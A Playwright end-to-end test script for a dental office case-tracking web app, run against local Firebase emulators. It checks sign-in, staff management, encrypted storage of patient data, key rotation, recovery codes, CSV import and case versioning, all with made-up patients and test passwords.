// End-to-end against the Firebase emulators (auth 9099, firestore 8080) with the real built page.
const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');
const zlib = require('zlib');
const { routes, watch, panelsOpen } = require('./helpers');
const { makeGas } = require('./gas');
const URL0 = 'http://127.0.0.1:8765/nlo-cases.html?emu';
const PROJECT = 'demo-nlo-cases';
const fails = [], passes = [];
const check = (c, m) => { (c ? passes : fails).push(m); console.log((c ? '  ok  ' : '  FAIL') + ' ' + m); };
const sleep = ms => new Promise(r => setTimeout(r, ms));
let SECTION = ''; const _log = console.log; console.log = (...a) => { if (typeof a[0] === 'string' && a[0].startsWith('\n# ')) SECTION = a[0].trim(); _log(...a); };
const forbidden = [];

async function fsDump() {
  // read every document as raw JSON with the emulator's admin bypass
  const out = [];
  for (const col of ['cases', 'log', 'members', 'roster', 'meta', 'logins', 'inbox', 'mailbeat', 'mailbots', 'photos']) {
    const r = await fetch(`http://127.0.0.1:8080/v1/projects/${PROJECT}/databases/(default)/documents/${col}?pageSize=1000`, { headers: { Authorization: 'Bearer owner' } });
    const j = await r.json(); (j.documents || []).forEach(d => out.push(d));
  }
  return out;
}
async function verifyEmail(email) {
  const r = await (await fetch(`http://127.0.0.1:9099/emulator/v1/projects/${PROJECT}/oobCodes`)).json();
  const codes = (r.oobCodes || []).filter(c => c.email === email && c.requestType === 'VERIFY_EMAIL');
  if (!codes.length) throw new Error('no verify email for ' + email);
  await fetch(codes[codes.length - 1].oobLink);
}
async function newPage(browser, label, errs, vp, folded) {
  const ctx = await browser.newContext({ viewport: vp || { width: 1360, height: 900 }, acceptDownloads: true });
  await routes(ctx); if (!folded) await panelsOpen(ctx); // the case panel opens folded unless Expand all was tapped (3 Oct 2026)
  const p = await ctx.newPage(); watch(p, errs, label); global.__errs = errs; (global.__pages = global.__pages || []).push({ l: label, p });
  p.on('response', r => { if (r.status() === 403) { let docs = ''; try { docs = Array.from(new Set((r.request().postData() || '').match(/documents\/[A-Za-z_]+\/[A-Za-z0-9_\-]+/g) || [])).map(x => x.replace('documents/', '')).join(' '); } catch (e) { }
    forbidden.push(label + ' @ ' + SECTION + ' :: ' + r.request().method() + ' ' + r.url().replace(/\?.*/, '') + (docs ? ' [' + docs + ']' : '') + ' ' + new Date().toISOString().slice(11, 23)); } });
  return p;
}
async function signIn(p, user, pw) {
  await p.goto(URL0); await p.waitForSelector('#lgUser');
  await p.fill('#lgUser', user); await p.fill('#lgPw', pw); await p.click('#lgBtn');
}
async function waitApp(p) { await p.waitForSelector('#app:not(.hidden) .topBar', { timeout: 30000 }); }
async function addPerson(owner, name, username) {
  await owner.click('#nav-admin'); await owner.click('[data-act=addStaff]');
  await owner.fill('#asName', name); await owner.fill('#asUser', username); await owner.click('#asForm button[type=submit]');
  await owner.waitForSelector('.modal .kv', { timeout: 30000 });
  const temp = (await owner.locator('.modal .kv .v').nth(1).textContent()).trim();
  await owner.click('.modal [data-act=closeModal]');
  return temp;
}
async function newCase(p, o) {
  await p.click('.topBar [data-act=newCase]'); await p.waitForSelector('#ncForm');
  await p.click('#ncForm .tt[data-tile=' + o.type + ']'); await p.fill('#cf-patient', o.patient);
  // New case asks what an in-house set is, and an appliance case for its appliance (3 Oct 2026)
  if (o.type === 'nla') await p.click('#ncForm .pickRow[data-g=initial] .pick[data-v=' + (o.initial || 'yes') + ']');
  if (o.type === 'appliance') await p.click('#ncForm .pickRow[data-g=appliances] .pick[data-v="' + (o.appliance || 'Schwartz') + '"]');
  if (o.instructions) await p.fill('#cf-instrOther', o.instructions);
  if (o.delivery) await p.fill('#cf-deliveryDate', o.delivery);
  if (o.time) await p.selectOption('#cf-deliveryTime', o.time);
  await p.click('#ncSave'); await p.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
}
// when a board card doesn't show up: what the page had (search, view, tab, whether the case is loaded) — for the log
async function boardDiag(p, name, e) {
  const d = await p.evaluate(n => ({ q: S.q, qBox: (document.querySelector('#q') || {}).value, view: S.view, tab: S.boardFlow, loaded: Array.from(S.cases.values()).some(c => c.patient === n),
    toasts: Array.from(document.querySelectorAll('.toast')).map(t => t.textContent) }), name).catch(x => String(x));
  console.log('BOARD-DIAG ' + name + ' ' + JSON.stringify(d)); throw e;
}
async function openByName(p, name) {
  await p.click((await p.isVisible('#nav-list')) ? '#nav-list' : '#mnav-list'); await p.fill('#q', name);
  await p.waitForSelector('tr.click:has-text("' + name + '")', { timeout: 20000 });
  await p.click('tr.click:has-text("' + name + '")'); await p.waitForSelector('#drawer .dsList');
}

(async () => {
  const browser = await chromium.launch({ executablePath: '/opt/pw-browsers/chromium-1194/chrome-linux/chrome' });
  const errs = [];
  const OWNER_EMAIL = 'dr.test@example.com', OWNER_PW = 'Owner-Pass-123';
  const P1 = 'Zelda Cipherton', P2 = 'Quentin Ironsides', P3 = 'Marisol Afterkey';

  console.log('\n# Owner sets up the office');
  const owner = await newPage(browser, 'owner', errs);
  await owner.goto(URL0 + '#setup'); await owner.waitForSelector('#setupForm');
  await owner.fill('#suEmail', OWNER_EMAIL); await owner.fill('#suPw1', OWNER_PW); await owner.fill('#suPw2', OWNER_PW);
  await owner.click('#setupForm button[type=submit]');
  await owner.waitForSelector('#verifyForm', { timeout: 30000 });
  check(/dr\.test@example\.com/.test(await owner.textContent('#lockCard')), 'asks the owner to verify their email');
  await owner.click('#verifyForm button[type=submit]'); await owner.waitForSelector('.lockErr', { timeout: 20000 });
  check(/Not verified yet/.test(await owner.textContent('.lockErr')), 'cannot continue before verifying');
  await verifyEmail(OWNER_EMAIL);
  await owner.click('#verifyForm button[type=submit]');
  await owner.waitForSelector('#recShow', { timeout: 30000 });
  const RECOVERY = (await owner.textContent('#recShow')).trim();
  check(/^[A-Z0-9]{4}(-[A-Z0-9]{4}){5}$/.test(RECOVERY), 'recovery code shown in the right format');
  check(await owner.isDisabled('#codeDone'), 'cannot continue until the code is acknowledged');
  await owner.check('#codeAck'); await owner.click('#codeDone'); await waitApp(owner);
  check(await owner.isVisible('#nav-admin'), 'owner sees Team & security');

  console.log('\n# A second setup attempt is refused');
  const intruder = await newPage(browser, 'intruder', errs);
  await intruder.goto(URL0 + '#setup'); await intruder.waitForSelector('#setupForm');
  await intruder.fill('#suEmail', 'intruder@example.com'); await intruder.fill('#suPw1', 'Intruder-123456'); await intruder.fill('#suPw2', 'Intruder-123456');
  await intruder.click('#setupForm button[type=submit]');
  await intruder.waitForSelector('#verifyForm', { timeout: 30000 });
  await verifyEmail('intruder@example.com'); await intruder.click('#verifyForm button[type=submit]');
  await intruder.waitForSelector('.lockErr', { timeout: 30000 });
  check(/refused/i.test(await intruder.textContent('.lockErr')), 'someone else (even with a verified email) cannot set up or take over the office');
  await intruder.context().close();

  console.log('\n# Owner adds staff');
  const gwenTemp = await addPerson(owner, 'Gwen Tester', 'gwen');
  const kayTemp = await addPerson(owner, 'Kaylee Tester', 'kaylee');
  const sarahTemp = await addPerson(owner, 'Sarah Tester', 'sarah');
  check(/^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/.test(gwenTemp), 'temporary password issued');
  await owner.waitForSelector('text=Waiting for first sign-in');
  check((await owner.locator('text=Waiting for first sign-in').count()) === 3, 'three people waiting for first sign-in');

  console.log('\n# Gwen signs in for the first time');
  const gwen = await newPage(browser, 'gwen', errs);
  await signIn(gwen, 'gwen', 'WRONG-PASS-1'); await gwen.waitForSelector('.lockErr');
  check(/incorrect/i.test(await gwen.textContent('.lockErr')), 'wrong password is refused');
  await signIn(gwen, 'gwen', gwenTemp); await gwen.waitForSelector('#firstForm', { timeout: 30000 });
  await gwen.fill('#fpw1', 'short'); await gwen.fill('#fpw2', 'short'); await gwen.click('#fBtn');
  check(await gwen.isVisible('#firstForm'), 'short new password is blocked by the form');
  await gwen.fill('#fpw1', 'Gwen-Pass-2026'); await gwen.fill('#fpw2', 'Gwen-Pass-2026'); await gwen.click('#fBtn'); await waitApp(gwen);
  check(!(await gwen.isVisible('#nav-admin')), 'staff do not see Team & security');
  // the new-user tour (4 Oct 2026): offered once on Today at first sign-in; it opens practice mode (made-up patients) in its own tab
  await gwen.waitForSelector('#tourOffer', { timeout: 20000 });
  check(/New to NLO Cases\?/.test(await gwen.textContent('#tourOffer')), 'first sign-in: Today offers the hands-on tour');
  await gwen.screenshot({ path: 'shots/e2e-tour-offer.png' });
  const [prac] = await Promise.all([gwen.context().waitForEvent('page'), gwen.click('#tourOffer [data-act=tourOpen]')]);
  watch(prac, errs, 'gwen-practice');
  check(/nlo-cases\.html\?demo&tour=staff$/.test(prac.url()), '“Start the tour” opens practice mode, as staff, in a new tab (' + prac.url().replace(/^.*\//, '') + ')');
  await prac.waitForFunction(() => typeof TOUR !== 'undefined' && TOUR.on && TOUR.steps[TOUR.i].id === 'hi', null, { timeout: 15000 });
  check(await prac.evaluate(() => B === DEMO && B.me.name === 'Practice User' && !document.getElementById('nav-admin')), '…signed in to the made-up patients (not the office database) as “Practice User”, the tour running');
  await prac.close();
  await gwen.waitForSelector('#tourOffer', { state: 'detached', timeout: 5000 });
  check(await gwen.evaluate(() => S.inApp && B === FB), 'the offer goes once the tour is opened; Gwen’s real session carries on');
  await owner.click('#nav-today'); await owner.click('#nav-admin');
  await owner.waitForFunction(() => document.body.innerText.match(/Waiting for first sign-in/g)?.length === 2, null, { timeout: 15000 });
  check(true, 'owner sees Gwen move to Active');

  console.log('\n# Kaylee and Sarah sign in for the first time');
  const kay = await newPage(browser, 'kaylee', errs);
  await signIn(kay, 'Kaylee', kayTemp); await kay.waitForSelector('#firstForm', { timeout: 30000 });
  await kay.fill('#fpw1', 'Kaylee-Pass-2026'); await kay.fill('#fpw2', 'Kaylee-Pass-2026'); await kay.click('#fBtn'); await waitApp(kay);
  check(true, 'username is case-insensitive at sign-in');
  await kay.waitForSelector('#tourOffer', { timeout: 20000 });
  await kay.click('#tourOffer [data-act=tourLater]');
  await kay.waitForSelector('#tourOffer', { state: 'detached', timeout: 5000 });
  check(/any time from My account/.test(await kay.textContent('#toasts')), 'tour offer: “Not now” hides it and says where the tour lives');
  await kay.click('#nav-account'); await kay.waitForSelector('[data-act=tourOpen]');
  check(/Take the tour/.test(await kay.textContent('[data-act=tourOpen]')), 'My account: “Take the tour”');
  await kay.click('#nav-today'); await kay.waitForSelector('.tiles');
  check(!(await kay.$('#tourOffer')), '…and Today doesn’t offer it again');
  const sarah = await newPage(browser, 'sarah', errs, { width: 390, height: 844 });
  await signIn(sarah, 'sarah', sarahTemp); await sarah.waitForSelector('#firstForm', { timeout: 30000 });
  await sarah.fill('#fpw1', 'Sarah-Pass-2026'); await sarah.fill('#fpw2', 'Sarah-Pass-2026'); await sarah.click('#fBtn');
  await sarah.waitForSelector('#app:not(.hidden) #view', { timeout: 30000 });
  await sarah.waitForSelector('#tourOffer', { timeout: 20000 });
  check(await sarah.evaluate(() => { const r = document.getElementById('tourOffer').getBoundingClientRect(); return r.left >= 0 && r.right <= innerWidth && document.documentElement.scrollWidth <= innerWidth; }), 'phone: the tour offer fits the screen');
  await sarah.screenshot({ path: 'shots/e2e-tour-offer-phone.png' });

  console.log('\n# Owner creates a case; staff see it live');
  await owner.click('#nav-today');
  await newCase(owner, { type: 'oliv', patient: P1, instructions: 'Close residual spaces — secret-instr-778' });
  await gwen.click('#nav-list');
  await gwen.waitForSelector('tr.click:has-text("' + P1 + '")', { timeout: 20000 });
  check(true, 'Gwen sees the new case without reloading');
  check(await gwen.isVisible('tr.click:has-text("' + P1 + '") >> text=Sarah Tester'), 'new Oliv case defaults to Sarah');
  await kay.click('#nav-list'); await kay.waitForSelector('tr.click:has-text("' + P1 + '")', { timeout: 20000 });
  check(true, 'Kaylee sees it too');

  console.log('\n# Nothing readable about a patient is stored');
  let dump = JSON.stringify(await fsDump());
  check(!dump.includes('Zelda') && !dump.includes('Cipherton'), 'patient name not present anywhere in Firestore');
  check(!dump.includes('secret-instr-778'), 'case text not present anywhere in Firestore');
  check(!dump.includes('"oliv"') && !dump.includes('Aligners (Oliv)') && !dump.includes('"submit"'), 'case type and stage are not stored in the clear');
  check(dump.includes('"ct"') && dump.includes('"iv"'), 'ciphertext fields are present');

  console.log('\n# Gwen moves the case and comments; owner sees both');
  await openByName(gwen, P1);
  await gwen.click('#drawer [data-act=setStage][data-k=dra]');
  await gwen.fill('#cmtText', 'Scan looks good, sent to Dr. A'); await gwen.click('[data-act=addCmt]');
  await gwen.waitForSelector('#drawer .cmt', { timeout: 15000 });
  await openByName(owner, P1);
  await owner.waitForSelector('#drawer .step.cur:has-text("Dr. A action")', { timeout: 15000 });
  check(true, 'stage change reached the owner');
  await owner.waitForSelector('#drawer .cmt:has-text("Scan looks good")', { timeout: 15000 });
  check(true, 'comment reached the owner');
  await owner.waitForSelector('#histBox .hist:has-text("moved it to Dr. A action")', { timeout: 15000 });
  check(await owner.isVisible('#histBox .hist:has-text("Gwen")'), 'history shows who moved it');

  console.log('\n# Two people edit the same case at once — both changes kept');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#cf-notes');
  await owner.fill('#cf-notes', 'owner-note-1');
  await gwen.click('#drawer [data-act=edit]'); await gwen.waitForSelector('#cf-cc');
  await gwen.fill('#cf-cc', 'gwen-cc-1');
  await Promise.all([owner.click('[data-act=saveEdit]'), gwen.click('[data-act=saveEdit]')]);
  await sleep(2500);
  await kay.click('#nav-today'); await openByName(kay, P1);
  await kay.waitForSelector('#drawer .txt:has-text("owner-note-1")', { timeout: 15000 });
  await kay.waitForSelector('#drawer .ccBox:has-text("gwen-cc-1")', { timeout: 15000 });
  check(true, 'both simultaneous edits survived');
  await kay.click('#drawer [data-act=closeDrawer] >> nth=0');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await gwen.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# Board: advance button and completing');
  await newCase(gwen, { type: 'retainer', patient: P2, delivery: '2020-01-01' });
  await owner.click('#nav-board'); await owner.fill('#q', ''); await owner.click('[data-act=flow][data-k=retainer]');
  await owner.waitForSelector('.kc:has-text("' + P2 + '")', { timeout: 15000 });
  check(await owner.isVisible('.kc:has-text("' + P2 + '") .due.over:has-text("Appt")'), 'a past delivery appt shows as late (“Appt … days late”)');
  await owner.click('#nav-today'); await owner.waitForSelector('.tile.red .n');
  check(Number(await owner.textContent('.tile.red .n')) >= 1, 'Today shows an overdue count');
  // the lists filter by the delivery date alone, not the lab date (Amir, 2 Oct 2026)
  await owner.click('#nav-list'); await owner.selectOption('select[data-f=del]', 'past');
  await owner.waitForSelector('#listBody tr.click:has-text("' + P2 + '")', { timeout: 15000 });
  check(/Delivery appt/.test(await owner.textContent('#listBody thead')) && await owner.isVisible('#listBody tr.click:has-text("' + P2 + '") td.apptCol .due.over:has-text("Appt")'), 'All open cases: “Delivery appt passed” finds it, red in its Delivery appt column');
  await owner.selectOption('select[data-f=del]', 'none'); await sleep(300);
  check(!(await owner.isVisible('#listBody tr.click:has-text("' + P2 + '")')), '“No delivery appt” leaves it out');
  await owner.click('[data-act=clearF]');
  await owner.click('#nav-board');
  for (let i = 0; i < 3; i++) { await owner.click('.kc:has-text("' + P2 + '") .adv'); await sleep(900); }
  await owner.waitForSelector('section[aria-label="Front desk pickup"] .kc:has-text("' + P2 + '")', { timeout: 15000 });
  check(true, 'advance moved the case through to the last stage');
  // reaching the last step asks whether it's done (3 Oct 2026); "Not yet" leaves it there
  await owner.waitForSelector('#cbNo', { timeout: 10000 });
  check(/Mark this case complete\?/.test(await owner.textContent('#modalWrap h3')) && /last step, Front desk pickup/.test(await owner.textContent('#modalWrap .lsub')), 'reaching the last step asks “Mark this case complete?”');
  await owner.click('#cbNo'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 5000 }).catch(() => {});
  check(await owner.isVisible('section[aria-label="Front desk pickup"] .kc:has-text("' + P2 + '")'), '“Not yet” keeps it open at its last step');
  await owner.click('.kc:has-text("' + P2 + '") .adv');
  await owner.waitForSelector('.kc:has-text("' + P2 + '")', { state: 'detached', timeout: 15000 });
  check(true, 'completing removes it from the board');
  await owner.waitForSelector('.toast:has-text("Undo") button', { timeout: 5000 });
  await owner.click('.toast:has-text("Undo") button'); await owner.waitForSelector('.kc:has-text("' + P2 + '")', { timeout: 15000 });
  check(true, 'Undo brings it back');
  await owner.click('.kc:has-text("' + P2 + '") .adv'); await owner.waitForSelector('.kc:has-text("' + P2 + '")', { state: 'detached', timeout: 15000 });
  await owner.click('#nav-done'); await owner.fill('#q', ''); await owner.waitForSelector('tr.click:has-text("' + P2 + '")', { timeout: 15000 });
  check(true, 'completed case listed under Completed');

  console.log('\n# Reissue Gwen: her session ends, old password dead, new one works');
  await owner.click('#nav-admin');
  owner.once('dialog', d => d.accept());
  await owner.click('tr:has-text("Gwen Tester") [data-act=reissue]'); await owner.click('#cbYes');
  await owner.waitForSelector('.modal .kv', { timeout: 30000 });
  const gwenTemp2 = (await owner.locator('.modal .kv .v').nth(1).textContent()).trim();
  await owner.click('.modal [data-act=closeModal]');
  await gwen.waitForSelector('#lockWrap:not(.hidden) .lockOk', { timeout: 20000 });
  check(/turned off|access changed/i.test(await gwen.textContent('.lockOk')), 'Gwen is signed out when her login is reissued');
  await signIn(gwen, 'gwen', 'Gwen-Pass-2026'); await gwen.waitForSelector('.lockErr', { timeout: 20000 });
  check(true, 'old password no longer works: ' + (await gwen.textContent('.lockErr')).trim());
  await signIn(gwen, 'gwen', gwenTemp2); await gwen.waitForSelector('#firstForm', { timeout: 30000 });
  await gwen.fill('#fpw1', 'Gwen-Pass-NEW'); await gwen.fill('#fpw2', 'Gwen-Pass-NEW'); await gwen.click('#fBtn'); await waitApp(gwen);
  check(true, 'Gwen is back in with her new password');

  console.log('\n# Remove Kaylee: locked out at once, key changes, everyone else keeps working');
  const v1 = JSON.parse(JSON.stringify(await fsDump())).filter(d => d.name.includes('/cases/')).map(d => d.fields.v.integerValue);
  check(v1.every(v => v === '1'), 'all cases on key version 1 before removal');
  await owner.click('#nav-admin');
  await owner.click('tr:has-text("Kaylee Tester") [data-act=removeStaff]'); await owner.click('#cbYes');
  await kay.waitForSelector('#lockWrap:not(.hidden) .lockOk', { timeout: 20000 });
  check(true, 'Kaylee is locked out while signed in');
  await owner.waitForSelector('.toast:has-text("Office key changed")', { timeout: 60000 });
  const v2 = (await fsDump()).filter(d => d.name.includes('/cases/')).map(d => d.fields.v.integerValue);
  check(v2.length > 0 && v2.every(v => v === '2'), 'every case re-sealed under key version 2 (' + v2.length + ' cases)');
  await signIn(kay, 'kaylee', 'Kaylee-Pass-2026'); await kay.waitForSelector('.lockErr', { timeout: 20000 });
  check(/No login/i.test(await kay.textContent('.lockErr')), 'Kaylee can no longer sign in');
  await newCase(gwen, { type: 'nla', patient: P3 });
  await owner.click('#nav-list'); await owner.fill('#q', P3);
  await owner.waitForSelector('tr.click:has-text("' + P3 + '")', { timeout: 20000 });
  check(true, 'Gwen (still signed in) can create cases after the key change');
  await sarah.waitForFunction(n => document.body.innerText.includes(n) || true, P3);
  await sarah.click('#mnav-list'); await sarah.fill('#q', P3);
  await sarah.waitForSelector('tr.click:has-text("' + P3 + '")', { timeout: 20000 });
  check(true, 'Sarah (phone, still signed in) reads the new-key case');
  await openByName(sarah, P1); check(await sarah.isVisible('#drawer .txt:has-text("owner-note-1")'), 'Sarah reads the re-sealed old case');

  console.log('\n# Idle lock');
  await sarah.evaluate(() => { S.lastAct = Date.now() - 11 * 60000; });
  await sarah.waitForSelector('#lockWrap:not(.hidden) .lockOk', { timeout: 25000 });
  check(/without activity/i.test(await sarah.textContent('.lockOk')), 'idle lock signs out after the set time');
  check((await sarah.evaluate(() => S.cases.size)) === 0, 'decrypted cases wiped from memory on lock');

  console.log('\n# Staff change their own password');
  await gwen.click('#nav-account'); await gwen.fill('#pwCur', 'Gwen-Pass-NEW'); await gwen.fill('#pwN1', 'Gwen-Pass-3'); await gwen.fill('#pwN2', 'Gwen-Pass-3');
  await gwen.click('#pwForm button[type=submit]'); await gwen.waitForSelector('.toast:has-text("Password changed")', { timeout: 30000 });
  await gwen.click('#side [data-act=lock]'); await signIn(gwen, 'gwen', 'Gwen-Pass-3'); await waitApp(gwen);
  check(true, 'new password works after change');

  console.log('\n# Owner forgets password -> reset -> recovery code');
  const ownerUid = await owner.evaluate(() => FB.uid);
  const r = await fetch('http://127.0.0.1:9099/identitytoolkit.googleapis.com/v1/accounts:update?key=demo-key', { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: 'Bearer owner' }, body: JSON.stringify({ localId: ownerUid, password: 'Owner-Reset-999' }) });
  check(r.ok, 'emulator password reset applied');
  await owner.click('#side [data-act=lock]');
  await signIn(owner, OWNER_EMAIL, 'Owner-Reset-999'); await owner.waitForSelector('#recForm', { timeout: 30000 });
  await owner.fill('#recCode', 'AAAA-BBBB-CCCC-DDDD-EEEE-FFFF'); await owner.click('#recForm button[type=submit]');
  await owner.waitForSelector('.lockErr', { timeout: 30000 }); check(true, 'wrong recovery code refused');
  await owner.fill('#recCode', RECOVERY.toLowerCase().replace(/-/g, ' ')); await owner.click('#recForm button[type=submit]');
  await waitApp(owner); await openByName(owner, P1);
  check(await owner.isVisible('#drawer .txt:has-text("owner-note-1")'), 'owner reads cases after recovery');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  await owner.click('#side [data-act=lock]'); await signIn(owner, OWNER_EMAIL, 'Owner-Reset-999'); await waitApp(owner);
  check(true, 'owner signs in normally with the new password afterwards');

  console.log('\n# Import from an Asana CSV (made-up rows), then re-import is skipped');
  const csv = [
    'Task ID,Created At,Completed At,Last Modified,Name,Section/Column,Assignee,Assignee Email,Start Date,Due Date,Tags,Notes,Projects,Parent task',
    '9001,2026-09-20,,2026-09-21,"Imogen Fakeworth - Aligners (Oliv)",SARAH TO Submit,Sarah Tester,,,2026-10-15,,"Patient: Imogen Fakeworth\nAppliance Type: Aligners\nAligner Type: Oliv\nScanner: Allied Star\nAssistant: Gwen\nScan Date: 2026-10-01\nLab Completion Date: 2026-10-22\nDelivery Date: 2026-10-29\nDr. A\'s Instructions: Close all spaces\nPatient\'s CC from Last Visit: -\nIPR & Spacing Tracker app  SPACING Lower: \n LR4–LR3 0.2mm\nTotal: 0.2mm",Oliv,',
    '9002,2026-09-20,,2026-09-21,"Bartholomew Notreal (U/L TT\'s and WT\'s) printing",Gwen - TT\'s/WT\'s,Gwen Tester,,,2026-10-06,,,Retainers and Whitening trays,',
    '9003,2026-09-20,2026-09-25,2026-09-25,"Old Finished Case - Aligners (In-House)",Checked In,Amir,,,2026-09-24,,,NL Lab,',
    '9004,2025-01-10,,2025-01-14,"Petunia Pickedup (U/L TT\'s)",FRONT DESK PICK UP,Gwen Tester,,,2025-01-15,,,Retainers and Whitening trays,'
  ].join('\n');
  const csvPath = path.join(__dirname, 'asana-sample.csv'); fs.writeFileSync(csvPath, csv);
  await owner.click('#nav-import'); await owner.setInputFiles('#csvFiles', csvPath);
  await owner.waitForSelector('[data-act=doImport]', { timeout: 20000 });
  check(/Ready to import: 2/.test(await owner.textContent('#impPreview')), 'preview: 2 open cases (completed one left out)');
  check(/1 already delivered/.test(await owner.textContent('#impPreview')), 'an open Asana task already picked up long ago (last column) is left out as delivered');
  await owner.click('[data-act=doImport]'); await owner.waitForSelector('#impPreview .lockOk', { timeout: 30000 });
  await openByName(owner, 'Imogen Fakeworth');
  check(await owner.isVisible('#drawer .step.cur:has-text("To submit")'), 'imported stage mapped from the Asana section');
  check(await owner.isVisible('#drawer .txt:has-text("Close all spaces")'), 'Tally fields parsed into the case');
  check(await owner.isVisible('#drawer .txt:has-text("LR4–LR3 0.2mm")'), 'multi-line IPR note kept');
  check((await owner.getAttribute('#drawer .dAssign .aTile[aria-pressed=true]', 'data-v')) === 'sarah', 'Asana assignee matched to the staff login');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  await openByName(owner, 'Bartholomew Notreal');
  check(await owner.isVisible('#drawer .step.cur:has-text("Printing")'), 'retainer section mapped to Printing');
  check((await owner.getAttribute('#drawer .dAssign .aTile[aria-pressed=true]', 'data-v')) === 'gwen', 'retainer assigned to the assistant named in the section');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  await owner.click('#nav-import'); await owner.setInputFiles('#csvFiles', csvPath);
  await owner.waitForSelector('#impPreview:has-text("already imported")', { timeout: 20000 });
  check(/Ready to import: 0/.test(await owner.textContent('#impPreview')), 're-importing the same file adds nothing');
  dump = JSON.stringify(await fsDump());
  check(!dump.includes('Imogen Fakeworth') && !dump.includes('Bartholomew Notreal'), 'imported names are encrypted too');

  console.log('\n# Saved versions: restore an earlier copy, then the later one');
  await openByName(owner, P1);
  await owner.click('#drawer [data-act=versions]'); await owner.waitForSelector('#verList table', { timeout: 20000 });
  const nVer = await owner.locator('#verList tbody tr').count();
  check(nVer >= 4, 'case has its earlier versions (' + nVer + ')');
  await owner.click('#verList tbody tr:last-child [data-act=restoreVer]');
  await owner.waitForSelector('#drawer .step.cur:has-text("To submit")', { timeout: 20000 });
  check(!(await owner.isVisible('#drawer .txt:has-text("owner-note-1")')), 'restoring the first version brings back the original contents');
  await owner.waitForSelector('#histBox .hist:has-text("restored an earlier version")', { timeout: 15000 });
  await owner.click('#drawer [data-act=versions]'); await owner.waitForSelector('#verList table', { timeout: 20000 });
  await owner.click('#verList tbody tr:first-child [data-act=restoreVer]');
  await owner.waitForSelector('#drawer .txt:has-text("owner-note-1")', { timeout: 20000 });
  check(true, 'the newer copy was kept and can be restored too');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# Delete, then bring it back');
  await openByName(owner, P3);
  await owner.click('#drawer [data-act=delCase]'); await owner.click('#cbYes');
  await owner.waitForSelector('tr.click:has-text("' + P3 + '")', { state: 'detached', timeout: 20000 });
  check(true, 'deleted case leaves the lists');
  dump = JSON.stringify(await fsDump());
  check(!dump.includes('Marisol') && !dump.includes('Afterkey'), 'the kept copy of the deleted case is encrypted too');
  await owner.click('#nav-admin'); await owner.click('[data-act=loadDeleted]');
  await owner.waitForSelector('#delBox .row:has-text("' + P3 + '")', { timeout: 20000 });
  await owner.click('#delBox .row:has-text("' + P3 + '") [data-act=undelete]');
  await owner.waitForSelector('.toast:has-text("' + P3 + ' restored")', { timeout: 20000 });
  await owner.click('#nav-list'); await owner.fill('#q', P3);
  await owner.waitForSelector('tr.click:has-text("' + P3 + '")', { timeout: 20000 });
  check(true, 'deleted case restored from Team & security');
  check((await fsDump()).filter(d => /\/log\//.test(d.name) && d.fields.del && d.fields.del.booleanValue === true).length === 1, 'its history entry is marked as a delete (Deleted cases reads only those, not every recent entry)');
  await owner.fill('#q', ''); await owner.click('#nav-admin'); await owner.click('[data-act=loadDeleted]');
  await owner.waitForFunction(n => { const b = document.querySelector('#delBox'); return !!b && !/Loading/.test(b.textContent) && !b.textContent.includes(n); }, P3, { timeout: 20000 });
  check(/Nothing deleted/.test(await owner.textContent('#delBox')), 'once it’s back, Deleted cases doesn’t offer it again (it came back under a new id)');
  await owner.click('#nav-list');

  console.log('\n# IPR Tracker link (made-up IPR patient in the database emulator)');
  const seed = { patients: { p1: { id: 'p1', name: 'ZQ', patient_id: '15-6541' } }, visits: { p1: {
    v1: { id: 'v1', patient_uuid: 'p1', date: '2026-08-20', created_at: '2026-08-20T10:00:00Z', upper_ipr: { 'UR2|UR1': '0.2' }, lower_ipr: {}, upper_spaces: {}, lower_spaces: {}, upper_bt: {}, lower_bt: {} },
    v2: { id: 'v2', patient_uuid: 'p1', date: '2026-09-28', created_at: '2026-09-28T10:00:00Z', assistant_initials: 'AR', upper_ipr: {}, lower_ipr: JSON.stringify({ 'LR3|LR2': '0.2' }), upper_spaces: { 'UR1|UL1': '0.3' }, lower_spaces: {}, upper_bt: { 'UR1|UL1': true }, lower_bt: {} } } } };
  const put = (path, body) => fetch('http://127.0.0.1:9000/' + path + '.json?ns=demo-nlo-cases', { method: 'PUT', headers: { Authorization: 'Bearer owner' }, body: JSON.stringify(body) });
  await fetch('http://127.0.0.1:9000/.settings/rules.json?ns=demo-nlo-cases', { method: 'PUT', headers: { Authorization: 'Bearer owner' }, body: JSON.stringify({ rules: { '.read': 'auth != null', '.write': false } }) });
  check((await put('nlo/ipr', seed)).ok, 'seeded the IPR emulator');
  await owner.fill('#q', '');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=oliv]'); await owner.fill('#cf-patient', 'Ivy Pulltest');
  await owner.fill('#cf-chart', '999-0000'); await owner.click('[data-act=iprPull]');
  await owner.waitForSelector('#cf-iprMsg:has-text("No IPR Tracker patient")', { timeout: 20000 }); check(true, 'unknown chart # says so');
  await owner.fill('#cf-chart', '156541'); await owner.click('[data-act=iprPull]');
  await owner.waitForSelector('#cf-iprMsg:has-text("From the visit on")', { timeout: 20000 });
  const pulled = await owner.inputValue('#cf-ipr');
  check(/IPR THIS VISIT\nUpper: none|Lower: LR3–LR2 0\.2mm/.test(pulled) && /UR1–UL1 0\.3mm/.test(pulled) && /CUMULATIVE IPR \(2 visits\)/.test(pulled), 'chart # without the dash still finds the patient; newest visit + cumulative pulled');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await openByName(owner, 'Ivy Pulltest');
  await owner.waitForSelector('#iprBox .stat:has-text("In the chart note")', { timeout: 20000 });
  check(true, 'the case panel shows the pulled IPR note is the one in the chart note');
  // one IPR section drawing the IPR Tracker's chart (3 Oct 2026): newest visit + IPR so far + spaces & black triangles
